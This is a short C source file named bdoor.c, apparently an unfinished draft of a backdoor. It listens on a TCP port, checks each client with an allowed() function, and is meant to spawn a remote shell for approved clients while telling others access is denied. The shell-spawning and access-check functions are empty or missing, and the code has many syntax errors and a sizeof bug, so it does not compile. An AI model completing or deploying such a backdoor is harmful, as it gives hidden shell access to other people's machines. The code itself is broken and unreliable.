/* bdoor.c */

#include <assert.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <unistd.h>

#define BUF_LEN 512

int
echo_server(int fd) {
	char *msg = "Hello clien! Your access has been denied";
	write(fd, msg, sizeof (msg));	
}

int
allowed(struct *sockaddr_storage) {
	
}

int spawn_server(int fd) {

}

int
main(int argc, char *argv[])
{
	int fd, newsock;
	struct addrinfo *r, *res, hints;	
	struct sockaddr_storage ca, client;

	if (argc < 4)
		errx(1, "usage: %s <addr> <port> <addr>...", basename(argv[0]));
		
	memset(&hints, 0, sizeof (hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	if (getaddrinfo(argv[1], argv[2], &hi, &res) == -1)
		err(1, getaddrinfo);

	for (r = res; r != NULL; r = r->ai next) {
		if ((fd = socket(r->ai family, r->ai socktype,
			r->ai protocol)) == -1)
				err(1, socket);
		
		if (bind(fd, r->ai addr, r->ai addrlen) == 0) 
			break;
	}

	if (listen(fd, 0) == -1)
		err(1, listen);
		
	while (1) {
		char buf[BUF_LEN];
		
		if ((newsock = accept(fd, &client, sizeof (client))) == -1)
			err(1, accept);
			
		if (allowed(client)) {
			spawn_shell(newsock);
		}
		else {
			echo_server(client);
		}
	}
	
	close(fd);
	return 0;
}
	
